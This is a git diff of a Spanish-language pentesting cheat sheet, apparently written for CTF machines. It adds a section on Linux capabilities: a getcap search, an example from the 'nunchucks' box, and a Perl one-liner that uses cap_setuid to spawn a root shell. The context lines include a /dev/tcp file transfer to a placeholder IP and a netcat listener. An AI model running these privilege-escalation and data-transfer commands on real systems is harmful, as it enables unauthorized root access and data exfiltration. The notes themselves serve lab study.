@@ -79,6 +79,28 @@ cat out.txt > /dev/tcp/IP/port
 
 nc -lvpn port > out.txt
 ```
+## Linux capabliities
+
+
+En Linux, las "capabilities" son un conjunto de privilegios más granulares que permiten a los procesos ejecutarse con ciertos privilegios sin necesidad de otorgarles todos los privilegios de superusuario (root). Esto proporciona una forma de controlar los permisos de manera más precisa y reducir el riesgo de seguridad asociado con la ejecución de procesos con privilegios completos de root.
+
+Para ver las capabilities usa:
+
+```
+getcap -r / 2>/dev/null
+
+## Por ejemplo esta la use en la maquina nunchucks
+
+/usr/bin/perl = cap_setuid+ep
+
+# Para escalar privilegios
+
+#!/usr/bin/perl
+use POSIX;
+setuid(0);
+exec "/bin/bash";
+
+```
 
 ## Stenografia
 
